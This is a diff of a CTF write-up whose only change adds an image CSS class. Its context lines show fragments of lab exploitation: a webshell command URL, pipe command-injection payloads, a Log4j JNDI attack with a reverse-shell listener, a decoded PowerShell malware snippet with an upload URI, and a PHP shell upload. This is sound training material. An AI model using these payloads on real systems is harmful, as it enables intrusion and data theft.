@@ -5,9 +5,9 @@ category: Write-Ups
 tags: write-up,ctf,cybershock
 ---
 
-![CyberShock 2022 banner](../../images/cybershock-2022-banner.png)
+![CyberShock 2022 banner](../../images/cybershock-2022-banner.png){: .image-process-crisp}
 
-![CTF details](../../images/cybershoch-2022-ctf-details.png)
+![CTF details](../../images/cybershoch-2022-ctf-details.png){: .image-process-crisp}
 
 ## Overview
 
@@ -22,17 +22,17 @@ hints, closing challenges).
 
 We couldn't complete the last challenges (cryptography related):
 
-![CTF mission board](../../images/cs2022-mission-board.png)
+![CTF mission board](../../images/cs2022-mission-board.png){: .image-process-crisp}
 
 And you can see us here on the leaderboard:
 
-![CTF leaderboard](../../images/cs2022-leaderboard.png)
+![CTF leaderboard](../../images/cs2022-leaderboard.png){: .image-process-crisp}
 
 At our level, there was close competition and if we hadn't completed a single challenge
 we could have landed 9th or 10th, but in the last few minutes we completed the "Minecraft"
 challenge (300pts) which boosted us to the 6th place.
 
-![CTF leaderboard closer](../../images/cs2022-leaderboard-2.png)
+![CTF leaderboard closer](../../images/cs2022-leaderboard-2.png){: .image-process-crisp}
 
 Overall CTF had an interesting theme along with some defense/hardening tasks
 which were checked by an automated script that I really liked, like adding a password on
@@ -110,7 +110,7 @@ was the password "admin" and the guess was correct.
 On the landing page, I checked what version of Pi-hole
 was installed.
 
-![Pi-Hole landing page with version highlighted](../../images/pi-hole-version.png)
+![Pi-Hole landing page with version highlighted](../../images/pi-hole-version.png){: .image-process-crisp}
 
 The next obvious thing was to check if any vulnerability is present on that version in Exploit DB,
 where this was found: <https://www.exploit-db.com/exploits/48519>
@@ -152,27 +152,27 @@ Ok, cool. Where's the shell? Turns out it was a dud.
 Multiple attempts were made, but non-succeeded, but
 luckly after trying a custom payload to test the exploit, it was a success!
 
-![Modified part of the RCE code](../../images/auth-rce-new-payload.png)
+![Modified part of the RCE code](../../images/auth-rce-new-payload.png){: .image-process-crisp}
 
 Exploit confirmed.
 
-![RCE exploit confirmed](../../images/auth-rce-exploit-confirmed.png)
+![RCE exploit confirmed](../../images/auth-rce-exploit-confirmed.png){: .image-process-crisp}
 
 So where did I check it? It was here:
 
-![Exploit location found](../../images/exploit-here.png)
+![Exploit location found](../../images/exploit-here.png){: .image-process-crisp}
 
 Replacing the payload with a simple webshell
 
-![New webshell payload](../../images/auth-rce-webshell-payload.png)
+![New webshell payload](../../images/auth-rce-webshell-payload.png){: .image-process-crisp}
 
 Exploit code output:
 
-![New payload output](../../images/auth-rce-exploit-code-output.png)
+![New payload output](../../images/auth-rce-exploit-code-output.png){: .image-process-crisp}
 
 And the flag was found by following this link: <http://env263.target03/admin/scripts/pi-hole/php/fun.php?cmd=cat%20/var/log/dnserror.log>
 
-![Found flag](../../images/always-dns-flag.png)
+![Found flag](../../images/always-dns-flag.png){: .image-process-crisp}
 
 #### COOL VIDEO
 
@@ -256,7 +256,7 @@ We tried a bunch of lucky guesses, but got a small mistake in the IP.
 
 Grepping the file again
 
-![Grep contents](../../images/grep-results.png)
+![Grep contents](../../images/grep-results.png){: .image-process-crisp}
 
 So the IP is 192.168.88.230, and if it's an encrypted communication channel, the the best guess for the port would be 443, that's if using HTTPS.
 
@@ -288,7 +288,7 @@ After logging in via SSH, the current file had to be closed in the Vim editor (e
 
 In the terminal execute `ssh billy@env263.target03 –p2223`.
 
-![Vim editor](../../images/stuck-vim.png)
+![Vim editor](../../images/stuck-vim.png){: .image-process-crisp}
 
 It was not as simple to exit with typing `:q!`, only by using the vim file explorer with command `:e .`
 it was possible to afterwards exit `vim`.
@@ -321,7 +321,7 @@ injection to find and reveal the flag.
 2. After trying verious payloads we notice that when passing `|` an error is thrown: `Fridge is self-aware! Error: 0x0 dumping stack trace: ' .  . '`
 3. Search for files in /etc/apt folder using the command inject we found `| ls -a /etc/apt` which leads us to the flag file `.flag.txt`.
 4. Final payload `| cat /etc/apt/.flag.txt` gives us flag.
-![Fridge payload](../../images/cybershock-2022-fridge.png)
+![Fridge payload](../../images/cybershock-2022-fridge.png){: .image-process-crisp}
 
 #### MAILBOX
 
@@ -375,7 +375,7 @@ for c in `openssl enc -list`; do openssl enc -d $c -k Kh39.3e12kleZs-po7 -in pin
 
 The flag was found!
 
-![Mailbox flag found](../../images/mailbox-flag-found.png)
+![Mailbox flag found](../../images/mailbox-flag-found.png){: .image-process-crisp}
 
 #### MINECRAFT
 
@@ -421,14 +421,14 @@ apt install dotnet-runtime-6
 
 But... "Connection has been lost."
 
-![MCC connection lost](../../images/mcc-connection-lost.png)
+![MCC connection lost](../../images/mcc-connection-lost.png){: .image-process-crisp}
 
 So what was the problem? It needed a username. There was a lot of
 struggle, but it was this simple.
 
 None tried the exploit before and I was just as oblivious when attempting it, spent some good time mistyping jndi as jindi.
 
-![Mistyped jndi](../../images/jndi-typo.png)
+![Mistyped jndi](../../images/jndi-typo.png){: .image-process-crisp}
 
 Once the `jndi` was properly typed, the response as handing and that's where we finally found that the exploit was possible.
 
@@ -492,13 +492,13 @@ After everything was setup, the following script was ran in the MC client to sen
 
 You will notice that the LDAP server is spammed, not sure what caused this, but had to kill the redirector just to not DoS the minecraft server.
 
-![Send jndi message and LDAP server](../../images/ldap-redirect-server.png)
+![Send jndi message and LDAP server](../../images/ldap-redirect-server.png){: .image-process-crisp}
 
-![HTTP servers and reverse shell listener](../../images/http-servers-running-with-listener.png)
+![HTTP servers and reverse shell listener](../../images/http-servers-running-with-listener.png){: .image-process-crisp}
 
 And after running the second payload, we are in!
 
-![Inside the minecraft server system](../../images/log4j-we-in.png)
+![Inside the minecraft server system](../../images/log4j-we-in.png){: .image-process-crisp}
 
 #### INFECTION
 
@@ -530,11 +530,11 @@ xfreerdp /v:env263.target04 /u:Administrator /p:Cool2Pass
 
 And greeted with this nice picture of a chicken
 
-![Chicken desktop](../../images/chicken.png)
+![Chicken desktop](../../images/chicken.png){: .image-process-crisp}
 
 Remembering what was mentioned in the description "Mother complaining", "failed logins", a good start would be to open "Internet Explorer" and check the history.
 
-![Internet Explorer history](../../images/ie-history.png)
+![Internet Explorer history](../../images/ie-history.png){: .image-process-crisp}
 
 Surely there's the Admin's page, so we're on the right browser and
 the history contains some peculiar entries, but not so useful.
@@ -543,22 +543,22 @@ Ok, where could we check malware activity? Processes? Logs?
 
 In the process monitor, powershell showed it's head from time to time, taking this hint, we're moving to logs.
 
-![Windows event viewer, powershell log entry highlighted](../../images/infected-windows-logs.png)
+![Windows event viewer, powershell log entry highlighted](../../images/infected-windows-logs.png){: .image-process-crisp}
 
 As we can see, there are a lot of frequent entries and a huge base64
 payload that reeks of malware.
 
 Now we open up CyberChef and analyze.
 
-![CyberChef decoded first payload](../../images/cyber-chef-decode.png)
+![CyberChef decoded first payload](../../images/cyber-chef-decode.png){: .image-process-crisp}
 
 Lots of spaces, but got rid of it with search and replace. So we're looking at this, and at the bottom we see that the base64 from variable `$e` is decoded and stored in `$s` which is lastly passed to some gzip compression function.
 
-![Cleaned up first payload](../../images/cleaned-decoded-first-payload.png)
+![Cleaned up first payload](../../images/cleaned-decoded-first-payload.png){: .image-process-crisp}
 
 Now we can do the same in CyberChef. First using "From Base64" and then "Gunzip".
 
-![Decoding the second payload with base64 and gunzip](../../images/base64-gunzip-cs2022.png)
+![Decoding the second payload with base64 and gunzip](../../images/base64-gunzip-cs2022.png){: .image-process-crisp}
 
 ```powershell
 $uri="http://check.ctf/upload"
@@ -650,7 +650,7 @@ Since entering in a regular IPv4 format address returned *"Not a public IP addre
 2. The desired output is an integer number: `2886994434`, which bypasses IP address filtering.
 3. And the flag was found.
 
-![Automated flag](../../images/health-check-flag.png)
+![Automated flag](../../images/health-check-flag.png){: .image-process-crisp}
 
 #### HARDEN
 
@@ -752,12 +752,12 @@ gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/common.txt
 
 Looking at the scan results, `robots.txt` file found which contained the following info:
 
-![Robots file](../../images/smart-bike-robots.png)
+![Robots file](../../images/smart-bike-robots.png){: .image-process-crisp}
 
 Visiting `/js/config.js` in the browser, revealed `/upl` endpoint that is used to store files uploaded
 by using the "create" method by the API and along with that the API key.
 
-![Config file](../../images/smart-bike-api.png)
+![Config file](../../images/smart-bike-api.png){: .image-process-crisp}
 
 Create a reverse shell listener on `9002` port to listen for connections: `nc -lvnp 9002`.
 
@@ -813,9 +813,9 @@ Solution here was to look for active running processes and one of processes cont
 
 1. SSH into server `ssh jack@env263.target03 -p2222`
 2. `ps aux` shows interesting running processes.
-   ![ps aux results](../../images/cybershock-2022-self-driving-car-1.png)
+   ![ps aux results](../../images/cybershock-2022-self-driving-car-1.png){: .image-process-crisp}
 3. `cd` into folder and `cat autonomous_shuttle_statushandler.py` gives us flag.
-   ![content of autonomous_shuttle_statushandler.py](../../images/cybershock-2022-self-driving-car-2.png)
+   ![content of autonomous_shuttle_statushandler.py](../../images/cybershock-2022-self-driving-car-2.png){: .image-process-crisp}
 
 #### BUS STOP
 
@@ -863,7 +863,7 @@ Solution here was to upload PHP file, get RCE and read /var/flag.txt content
 2. In /smartupload we where able to upload files but where do the go?
 3. After fuzzing with `gobuster dir -u http://env263.target03:8111/smartupload/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` we noticed the `/smartupload/uploads` folder.
 4. After opening BURP and modifying the POST request contents we can see `?msg=success` redirect location that indicates that our file was uploaded successfully.
-   ![Burp payload for php shell](../../images/cybershock-2022-maps.png)
+   ![Burp payload for php shell](../../images/cybershock-2022-maps.png){: .image-process-crisp}
 5. As we already know that files go into `/smartupload/uploads` path we go into our url <http://env263.target03:8111/smartupload/uploads/filename2.png?c=cat%20/var/flag.txt> and receive flag `?PNG  Flag: 3760cbd5-d23b-4517-8aee-26f43cb178d4`.
 
 #### REGISTRY (UNSOLVED by us)
@@ -915,19 +915,19 @@ Using the CTF discord invite link a CTF Tech Bot was visible as one of the first
 
 After sliding into the bot's DM's a *!minictf* was sent that resulted in the following reply:
 
-![Command output](../../images/automated-minictf.png)
+![Command output](../../images/automated-minictf.png){: .image-process-crisp}
 
 Correct answer is 00100000 (converting 32 from decimal to binary).
 
 After that the following question was provided:
 
-![Linux answer](../../images/automated-linux.png)
+![Linux answer](../../images/automated-linux.png){: .image-process-crisp}
 
 It is widely known that Linux is beneficial due to excellent performance rates and stability.
 
 After that a flag was provided to the team with ease:
 
-![Automated flag](../../images/automated-flag.png)
+![Automated flag](../../images/automated-flag.png){: .image-process-crisp}
 
 #### BOARDING PASS
 
@@ -988,7 +988,7 @@ to see the flag.
 3. Switch to the Spectogram View.
 4. Flag is shown in the spectrogram window: `ctf-tech{f571324-9bd3}`.
 
-![Automated flag](../../images/atis-flag.png)
+![Automated flag](../../images/atis-flag.png){: .image-process-crisp}
 
 #### FLIGHT-PLAN
 
@@ -1013,7 +1013,7 @@ Install qpdf package with `sudo apt-get install qpdf`.
 
 List attachments of the PDF file: `qpdf --list-attachments flight-plan.pdf`  
 
-![PDF contents](../../images/flight-plan-contents.png)
+![PDF contents](../../images/flight-plan-contents.png){: .image-process-crisp}
 
 Export the found attachment.
 
@@ -1027,7 +1027,7 @@ Open `attachment.pdf` using `wine` with command: `wine ATS\ flight\ plan-ori.pdf
 
 The flag is displayed after opening the attachment using `wine`.
 
-![PDF flag](../../images/flight-plan-flag.png)
+![PDF flag](../../images/flight-plan-flag.png){: .image-process-crisp}
 
 #### WEATHER DATA
 
@@ -1101,7 +1101,7 @@ Connect using SSH: `sshpass -p Cool2Pass ssh -p 2222 user@env263.target02`.
 
 Examine the contents of `/var/www/html`. The `evidence` folder needs to be protected.
 
-![HTML folder](../../images/top-secret-html.png)
+![HTML folder](../../images/top-secret-html.png){: .image-process-crisp}
 
 Change current directory to `/var/www/html/evidence` and execute the following:
 
@@ -1133,7 +1133,7 @@ Finally restarted the apache service using `sudo service apache2 restart` and af
 
 Here's the expected login prompt:
 
-![Login prompt](../../images/top-secret-login.png)
+![Login prompt](../../images/top-secret-login.png){: .image-process-crisp}
 
 #### BACKDOORED IMAGE
 
@@ -1158,7 +1158,7 @@ Due to the attacker not deleting the persistance script in the same layer, it wa
 
 Go to Docker Hub and check all of the image layers. The layer that we are interested in is layer 9, in which a quite interesting `persistence.sh` bash script is being executed.
 
-![Docker image layers](../../images/backdoor-image-layers.png)
+![Docker image layers](../../images/backdoor-image-layers.png){: .image-process-crisp}
 
 Extract the docker image into a `.tar` file.
 
@@ -1174,7 +1174,7 @@ Unarchive all of the image layers by using linux `find` command.
 find -name layer.tar -exec tar -xf {} \;
 ```
 
-![Layer.tar structure](../../images/backdoor-layer-tar.png)
+![Layer.tar structure](../../images/backdoor-layer-tar.png){: .image-process-crisp}
 
 A `persistence.sh` script can be seen in the screenshots above and to get the flag simply open it.
 
